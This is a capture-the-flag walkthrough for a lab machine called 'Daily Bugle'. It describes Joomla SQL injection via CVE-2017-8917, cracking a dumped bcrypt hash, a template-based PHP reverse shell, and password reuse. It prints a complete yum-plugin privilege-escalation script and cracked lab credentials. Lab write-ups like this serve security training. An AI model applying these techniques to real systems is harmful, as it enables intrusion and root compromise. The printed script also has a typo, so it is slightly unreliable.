[![Needed-nmap](https://img.shields.io/badge/Needed-nmap-blue)](https://nmap.org/)
[![Needed-Gobuster](https://img.shields.io/badge/Needed-Gobuster-orange)](https://github.com/OJ/gobuster)
[![Needed-John](https://img.shields.io/badge/Needed-John-red)](https://github.com/openwall/john)

# Daily Bugle
*Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.*

## Reconnaissance and Enumeration
Let's see what we have today:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ sudo nmap -sC -sV -A 10.10.160.251     
[sudo] password for marco: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-24 21:54 CET
Nmap scan report for 10.10.160.251
Host is up (0.049s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)
```

A brief view of the open ports:
- **Port 22**: SSH. No key no party
- **Port 80**: Apache httpd web server. On `robots.txt` there are a lot of disallowed links :)
- **Port 3306**: MariaDB DBSM. Not accessible by our IP address

We run gobuster as usual, just to be sure, but all the useful endpoints are listed in `robots.txt`.

### A check on port 80's secret dirs
The most interesting link in robots.txt is `/administrator`, so it is the first one to be checked out. It contains a Joomla login form, which means that on httpd is running a Joomla instance with the website.<br>
To get Joomla's version we can see the XML manifest at the link `/administrator/manifests/files/joomla.xml`.
<details>
  <summary>Spoiler warning</summary>
    Our is version 3.7.0
</details>

## Hack Joomla
Searching quickly on Google we find very easily that this version is vulnerable to SQL injection [(CVE-2017-8917)](https://www.cvedetails.com/cve/CVE-2017-8917/). A lot of automated exploits are available on the net, I chose [Joomblah](./joomblah.py).<br>
Running Joomblah we can dump the user table. This is the content:
```
['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```

The long string is the password hash and we need to crack it in order to access the admin panel.

### Hash crack
We can identify the hash with `hashid`: it's a bcrypt, a brute force "resistant" hash. We can still crack it, but it will take some time.
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/Daily_Bugle]
└─$ john pw.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
...
spiderman123     (?)                                                                                               
1g 0:00:05:23 DONE (2022-03-24 23:32) 0.003094g/s 145.0p/s 145.0c/s 145.0C/s thelma1..setsuna                      
Use the "--show" option to display all of the cracked passwords reliably                                           
Session completed. 
```

### Reverse shell
After gaining access to the admin panel and looking around it becomes obvious that the point of injection is in the template of the site: it's possible to modify the code for php pages directly from the browser!<br>
Obviously we can substitute the index page code with a [reverse shell](./reverse-shell.php). Loading the page will send us a reverse shell.


## Privilege Escalation
Unfortunately the shell is not logged with any user, so we need to escalate our privileges

### No user -> jjameson
Looking around there's seems to be nothing to escalate from here, but we can reed the website configuration file `/var/www/html/configuration.php`. 
This jjameson is a dummy... DB pwd is the same of jjameson account.

<img align="center" src="./NotAtHome.jpg" alt="drawing" style="width:300px;"/>

Entering jjameson account we read user flag :)

### jjameson -> root
Now in jjameson account we need to find a way to escalate to root. Running `sudo -l` we notice that yum is the only executable that we can run with root privileges.
With a little Google Fu, it's easy to find a vuln on [GTFOBins](https://gtfobins.github.io/gtfobins/yum/). With the following code we:
1. create a yum plugin that will spawn a shell
2. enable the plugin
3. run it with root privileges and gain the root shell

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
luginconfpath=$TFEOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Now the root flag became accessible in `/root/root.txt`